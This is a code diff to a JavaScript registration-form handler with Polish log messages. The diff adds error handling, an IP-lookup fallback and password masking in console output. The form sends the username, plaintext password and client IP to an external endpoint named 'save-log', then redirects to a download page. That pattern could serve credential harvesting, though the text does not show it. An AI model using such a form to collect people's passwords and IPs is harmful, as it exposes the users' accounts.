@@ -1,3 +1,4 @@
+// register.js - UPDATED WITH BETTER ERROR HANDLING
 document.getElementById('registrationForm').addEventListener('submit', async function(e) {
     e.preventDefault();
     
@@ -28,11 +29,17 @@ document.getElementById('registrationForm').addEventListener('submit', async fun
         console.log('🔄 Rozpoczynanie rejestracji...');
         
         // Pobierz IP użytkownika
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const userIP = ipData.ip;
+        let userIP = 'unknown';
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            userIP = ipData.ip;
+        } catch (ipError) {
+            console.log('⚠️ Nie udało się pobrać IP, używam fallback');
+            userIP = 'fallback-ip-' + Date.now();
+        }
 
-        console.log('📨 Wysyłanie danych:', { username, password, ip: userIP });
+        console.log('📨 Wysyłanie danych:', { username, password: '***', ip: userIP });
 
         // Wyślij do backendu
         const response = await fetch('https://social-tools.onrender.com/save-log', {
@@ -47,33 +54,48 @@ document.getElementById('registrationForm').addEventListener('submit', async fun
             })
         });
 
-        const result = await response.json();
+        console.log('📩 Status odpowiedzi:', response.status);
+
+        let result;
+        try {
+            result = await response.json();
+        } catch (jsonError) {
+            console.error('❌ Błąd parsowania JSON:', jsonError);
+            throw new Error('Serwer zwrócił nieprawidłową odpowiedź');
+        }
+        
         console.log('📩 Odpowiedź z serwera:', result);
         
-        if (result.success) {
-            showMessage('🎉 Rejestracja udana! Automatyczne logowanie...', 'success');
+        if (result && result.success) {
+            showMessage('🎉 Rejestracja udana! Przekierowywanie...', 'success');
             localStorage.setItem('currentUser', username);
             setTimeout(() => {
                 window.location.href = 'download.html';
             }, 2000);
         } else {
-            showMessage('❌ Błąd: ' + result.message, 'error');
+            const errorMsg = result ? result.message : 'Nieznany błąd serwera';
+            showMessage('❌ ' + errorMsg, 'error');
         }
     } catch (error) {
         console.error('💥 Błąd:', error);
-        showMessage('❌ Wystąpił błąd podczas rejestracji', 'error');
+        showMessage('❌ Błąd połączenia: ' + error.message, 'error');
     } finally {
         showLoading(false);
     }
 });
 
 function showLoading(show) {
-    document.getElementById('loading').style.display = show ? 'block' : 'none';
+    const loadingEl = document.getElementById('loading');
+    if (loadingEl) {
+        loadingEl.style.display = show ? 'block' : 'none';
+    }
 }
 
 function showMessage(message, type) {
     const messageEl = document.getElementById('message');
-    messageEl.textContent = message;
-    messageEl.className = 'message ' + type;
-    messageEl.style.display = message ? 'block' : 'none';
+    if (messageEl) {
+        messageEl.textContent = message;
+        messageEl.className = 'message ' + type;
+        messageEl.style.display = message ? 'block' : 'none';
+    }
 }
